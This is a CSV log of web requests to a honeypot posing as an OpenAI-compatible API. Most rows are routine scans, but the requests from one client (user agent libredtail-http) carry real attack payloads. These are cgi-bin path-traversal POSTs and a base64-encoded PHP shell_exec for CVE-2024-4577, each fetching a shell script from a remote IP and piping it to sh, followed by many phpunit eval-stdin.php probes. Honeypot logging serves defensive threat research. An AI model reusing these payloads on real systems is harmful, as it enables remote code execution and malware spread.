request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
3197d03d-8f43-44e3-a205-61aa7412d694,2026-03-29T04:47:50.982152+00:00,anon_f2ebea7d,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
d9a08ef1-9b4f-4371-b553-3b5ae4cb749e,2026-03-29T05:28:01.471993+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
6d4b62b2-448a-447b-b316-9426b761cdcc,2026-03-29T05:31:54.145734+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8a17d6a5-37fa-4231-a3ba-6322cd232622,2026-03-29T05:34:23.568066+00:00,anon_053273ad,GET,/.env,[honeypot-host],python-requests/2.32.3,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9cc9796e-23a8-4f45-86c0-257c064f8a88,2026-03-29T05:34:23.880985+00:00,anon_053273ad,GET,/.env.example,[honeypot-host],python-requests/2.32.3,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
53de7e4f-3019-4b0f-98d8-899194ece246,2026-03-29T05:37:14.950945+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
ca29681c-7808-4aac-b166-c70f54b4b372,2026-03-29T06:18:16.694478+00:00,anon_e1e5b879,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
666bf6c9-41f8-41ce-a6a3-d13d09ef9a93,2026-03-29T06:42:17.141670+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
6285b103-6191-447d-b772-353d46c9d159,2026-03-29T06:50:56.045478+00:00,anon_569f989f,GET,/,[honeypot-host],,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
d9bd97c9-300e-4dfc-9cbf-f2b303485ef6,2026-03-29T07:23:39.173806+00:00,anon_bfc6a070,GET,/,[honeypot-host],,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
31da7b93-c591-47e5-bc08-2cb651bdd1f7,2026-03-29T07:30:54.200043+00:00,anon_7c2582ec,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a1df4e11-9db1-45b7-b9b9-c0a8876747f8,2026-03-29T07:30:54.936795+00:00,anon_7c2582ec,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a7a25deb-e893-445d-9639-45668eb370ba,2026-03-29T07:30:55.699834+00:00,anon_7c2582ec,POST,/hello.world,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
679733a1-022a-4634-b7de-59ccb2c6a51e,2026-03-29T07:30:56.545385+00:00,anon_7c2582ec,POST,/,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d2d06c10-d5cb-4321-9413-366f8cb3aace,2026-03-29T07:30:57.313856+00:00,anon_7c2582ec,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
77bbad96-0bc4-4d23-b374-70a08f1a644e,2026-03-29T07:30:58.061325+00:00,anon_7c2582ec,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
24d92c02-8d95-4782-afba-01f2e14c89ea,2026-03-29T07:30:58.702395+00:00,anon_7c2582ec,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
29527136-33e0-41c8-8f81-96b08550ef59,2026-03-29T07:30:59.360294+00:00,anon_7c2582ec,GET,/vendor/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
de073de8-db0b-4e1a-91d4-b0ecc16cd679,2026-03-29T07:31:00.016422+00:00,anon_7c2582ec,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
837bde9c-368a-4fc0-9246-10c7373f51d5,2026-03-29T07:31:00.777244+00:00,anon_7c2582ec,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7028d0c2-985d-4f81-8d56-b4ac943dcd78,2026-03-29T07:31:01.651516+00:00,anon_7c2582ec,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0256da0e-73af-4de8-a503-44b226916b14,2026-03-29T07:31:02.541500+00:00,anon_7c2582ec,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2047b25e-917c-4b5f-a158-e9212f9b98aa,2026-03-29T07:31:03.345425+00:00,anon_7c2582ec,GET,/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d233a8de-68a9-4813-88b0-7dcac053e175,2026-03-29T07:31:04.256280+00:00,anon_7c2582ec,GET,/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9e1779ed-7233-4093-a9a6-61d9e9940d97,2026-03-29T07:31:04.990512+00:00,anon_7c2582ec,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4202b247-e12e-49d8-9417-23aa54ecef81,2026-03-29T07:31:05.688077+00:00,anon_7c2582ec,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8d51206a-ad67-4ca9-a3e8-54551966e1be,2026-03-29T07:31:06.512286+00:00,anon_7c2582ec,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
729a60e8-55c9-4793-8f8e-cbd45cf592c5,2026-03-29T07:31:07.497264+00:00,anon_7c2582ec,GET,/lib/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9efdd20b-9edd-4f72-8563-e8a21174ac42,2026-03-29T07:31:08.525977+00:00,anon_7c2582ec,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
11d8f52e-651c-485d-901d-4611b1d98188,2026-03-29T07:31:09.392292+00:00,anon_7c2582ec,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ff74fe32-4415-4975-a8ec-64a754fab1fb,2026-03-29T07:31:10.182717+00:00,anon_7c2582ec,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e5116733-9c0c-47ce-8541-2cf51844f138,2026-03-29T07:31:10.795441+00:00,anon_7c2582ec,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d04e32e9-b5cd-45fb-9ea5-623bfd9de533,2026-03-29T07:31:11.405153+00:00,anon_7c2582ec,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4cb66c8e-3e32-47c7-b49d-59ad1dafecf5,2026-03-29T07:31:12.000307+00:00,anon_7c2582ec,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
83bf4dca-7e58-47bb-96c1-f685a5932ef5,2026-03-29T07:31:12.749282+00:00,anon_7c2582ec,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1146214e-0b0a-4a17-aa5b-3899257d1793,2026-03-29T07:31:13.663128+00:00,anon_7c2582ec,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a7d0920a-6627-442f-9871-1ceb2621c3b3,2026-03-29T07:31:14.547477+00:00,anon_7c2582ec,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9833410b-ee92-4e81-9b2a-167fd3c8e54b,2026-03-29T07:31:15.299325+00:00,anon_7c2582ec,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
612f2838-fc83-4f8f-896a-d0ab4091c8ad,2026-03-29T07:31:15.902322+00:00,anon_7c2582ec,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0ca88172-752d-4465-8a68-9684458a9bc9,2026-03-29T07:31:16.474162+00:00,anon_7c2582ec,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
39a70217-234f-46c5-8a9e-67afd90831e3,2026-03-29T07:31:17.008442+00:00,anon_7c2582ec,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0a31eb60-837f-4263-8184-d3625f09505f,2026-03-29T07:31:17.563023+00:00,anon_7c2582ec,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a5575a16-225b-47ca-8a06-16d47d8ed6ea,2026-03-29T07:31:18.158555+00:00,anon_7c2582ec,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
45b49409-ba9d-4442-9b10-7e4300146b79,2026-03-29T07:31:18.826175+00:00,anon_7c2582ec,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1e861c76-806b-41ef-a5f8-1dfd83763dad,2026-03-29T07:31:19.668949+00:00,anon_7c2582ec,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
383f8ffb-8ba6-471f-b1af-eb9689829e61,2026-03-29T07:31:20.505247+00:00,anon_7c2582ec,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6724d660-53a0-41b7-91ff-fa612878ed5a,2026-03-29T07:31:21.349698+00:00,anon_7c2582ec,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fee77637-343e-4b6f-ad88-b3507c87ffa9,2026-03-29T07:31:22.365274+00:00,anon_7c2582ec,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7c8fd5ed-5872-4b6c-99c9-5a97655083fe,2026-03-29T07:31:23.085195+00:00,anon_7c2582ec,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
827a2c01-1b21-4dc1-a6a5-462479bc0b23,2026-03-29T07:31:23.737244+00:00,anon_7c2582ec,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fa656bdd-2429-4b4c-a251-808a4a991d35,2026-03-29T07:31:24.368405+00:00,anon_7c2582ec,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d3d703c8-78eb-4601-a40a-a7c13f4bebbf,2026-03-29T07:31:25.061953+00:00,anon_7c2582ec,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
30c5a679-84f3-43de-8cd1-b45cc5104caa,2026-03-29T07:31:25.757120+00:00,anon_7c2582ec,GET,/public/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
94b2ac34-4c3f-4d63-9b7b-680cec2d743b,2026-03-29T07:31:26.478887+00:00,anon_7c2582ec,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6dc2689e-97e3-4fba-87e5-30d775c9dc13,2026-03-29T07:31:27.220593+00:00,anon_7c2582ec,GET,/index.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4f878542-ff48-4593-bd57-04b7dece3638,2026-03-29T07:31:27.918339+00:00,anon_7c2582ec,GET,/containers/json,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
82987790-1644-4ff2-a2d0-cfe41ab58c39,2026-03-29T07:35:44.255411+00:00,anon_a8dd5581,GET,/,[honeypot-host],python-requests/2.32.5,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
f6f8755e-c63f-4ebb-ba62-5ef1cccba925,2026-03-29T07:35:46.995196+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
ea14caee-a6fb-41bf-8cea-b687c103d139,2026-03-29T08:21:32.022600+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
2d259a09-c32b-4616-9a43-0b61a73a8d1a,2026-03-29T08:22:39.981293+00:00,anon_095218c6,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dffa4bb8-0893-442f-99d9-748065c3b98e,2026-03-29T08:28:28.228577+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
de2ae718-3c14-4a93-befe-93f46ad14fd6,2026-03-29T08:34:06.226339+00:00,anon_32fe3235,GET,/.well-known/security.txt,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6673ca36-3100-423f-9808-74638c95ffaf,2026-03-29T08:46:11.737942+00:00,anon_a928e0b2,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
